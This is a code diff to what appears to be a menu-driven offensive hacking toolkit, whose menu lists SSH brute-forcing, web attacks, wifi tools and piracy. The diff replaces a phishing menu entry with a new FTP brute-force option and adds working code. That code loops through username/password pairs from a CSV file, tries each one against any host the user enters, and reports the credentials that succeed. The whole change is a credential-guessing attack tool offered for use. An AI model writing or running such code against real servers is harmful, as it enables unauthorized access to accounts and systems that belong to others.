@@ -20,6 +20,7 @@ import time
 import logging
 from logging import NullHandler
 from paramiko import SSHClient, AutoAddPolicy, AuthenticationException, ssh_exception
+from ftplib import FTP
 
 warnings.filterwarnings("ignore")
 
@@ -38,7 +39,7 @@ menu = """
         ||                                         |                                         ||                                                                                        
         ||          [1] Android                    |       [7] IOS         ️                  ||                                                                                        
         ||                                         |                                         ||                                                                                        
-        ||          [2] ssh-bruteforce             |       [8] phishing                      ||                                                                                        
+        ||          [2] ssh-bruteforce             |       [8] ftp-bruteforce                ||                                                                                        
         ||                                         |                                         ||                                                                                        
         ||          [3] steganography              |       [9] Piracy                        ||                                                                       
         ||                                         |                                         ||                                                                                        
@@ -59,7 +60,7 @@ next_menu = """
         ||                                         |                                         ||                                                                                        
         ||          [12] Web-attacks               |       [18] coming soon                  ||                                                                                        
         ||                                         |                                         ||                                                                                        
-        ||          [13] blackarch-wifi             |       [19] coming soon                  ||                                                                                        
+        ||          [13] blackarch-wifi             |       [19] coming soon                 ||                                                                                        
         ||                                         |                                         ||                                                                                        
         ||          [14] coming soon               |       [20] coming soon                  ||                                                                       
         ||                                         |                                         ||                                                                                        
@@ -536,6 +537,32 @@ def ssh_bruteforce():
     __main__()
 
 
+# function for ftp brute force
+def bruteForceLogin(hostname, passwordFile):
+    passList = open(passwordFile, 'r')
+    for line in passList.readlines():
+        userName = line.split(',')[0]
+        passWord = line.split(',')[1].strip('\r').strip('\n')
+        print("[+] Trying: " + str(userName) + "/" + str(passWord))
+        try:
+            ftp = FTP(hostname)
+            ftp.login(userName, passWord)
+            print("FTP Login succeded: " + str(userName) + "/" + str(passWord))
+            ftp.quit()
+            return (userName, passWord)
+        except Exception:
+            pass
+
+def ftp_bruteforce():
+    os.system('clear')
+    print(Fore.BLUE, banner)
+    hostName = str(input('Enter the host: '))
+    passwordFile = 'passwords.csv'
+    bruteForceLogin(hostName, passwordFile)
+
+    t = threading.Thread(target=bruteForceLogin, args=(hostName, passwordFile))
+    t.start()
+    time.sleep(0.2)
 
 def Steganography_extract():
     os.system('clear')
@@ -1032,7 +1059,7 @@ def main():
     elif me == '7':
         coming_soon()
     elif me == '8':
-        coming_soon()
+        ftp_bruteforce()
     elif me == '9':
         Piracy()
     elif me == '10':
